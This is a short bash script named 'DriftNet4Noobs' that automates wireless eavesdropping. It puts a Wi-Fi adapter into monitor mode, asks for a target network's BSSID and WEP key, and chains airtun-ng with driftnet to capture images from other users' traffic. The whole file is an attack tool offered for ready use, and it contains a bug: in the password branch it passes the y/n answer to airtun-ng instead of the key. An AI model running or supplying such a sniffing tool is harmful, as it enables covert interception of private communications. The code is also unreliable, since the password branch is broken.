#!/bin/bash
#DriftNet4Noobs v1.0 //Kyle Atkins\\
#Requires Linux root user / aircrack suite / common sense.
echo -e "\e[91m
 _____   _     _  ______  _______  _    _    _     _                _          
(_____) (_)   (_)(______)(__ _ __)(_)  (_)  (_)   (_)              (_)    ____ 
(_)  (_)(__)_ (_)(_)__      (_)   (_)__(_)_ (__)_ (_)  ___    ___  (_)_  (____)
(_)  (_)(_)(_)(_)(____)     (_)   (________)(_)(_)(_) (___)  (___) (___)_(_)__ 
(_)__(_)(_)  (__)(_)____    (_)        (_)  (_)  (__)(_)_(_)(_)_(_)(_)_(_)_(__)
(_____) (_)   (_)(______)   (_)        (_)  (_)   (_) (___)  (___) (____)(____)
                                                                               
"
#check if user === root
if [ "$UID" -ne 0 ]; then
        echo -e "\e[36m Script must be run as root, please login to continue"
        sleep 1
        exit
else
        #start wireless adapter in monitor mode
        echo -e "\e[36m Starting wireless adapter in monitor mode"
        sleep 1
        airmon-ng start wlan0
fi
echo "Hello, $USER Setting up sniffing enviroment"
echo -e "\e[4mPASSWORD SECURED NETWORKS ONLY WORK IF WEP ENCRYPTION!!!"
echo -e "\e[0m"
echo -e "\e[92m Which BSSID would you like to capture from?(ie 00:11:22:33:44)"
read bssid
echo -n "Does this network have a wifi password?:[Y/n] "
read pass_answer
if [[ ($pass_answer = "y") || ($pass_answer = "Y") ]];
	then
	echo -n "What is the password?"
	read wifi_password
	echo "Ok running airtun-ng now..."
	xterm -e airtun-ng -a $bssid -w $pass_answer -t 1 mon0
	eval "ifconfig at0 up"
	xterm -e driftnet -v -i at0
else
	echo "Ok no password..."
	sudo -b gnome-terminal --execute bash -c "airtun-ng -a $bssid -t 1 mon0"
	sleep 1
	sudo -b gnome-terminal --execute bash -c "ifconfig at0 up"
	sleep 1	
	eval "driftnet -v -i at0"
fi
echo "End of the line"
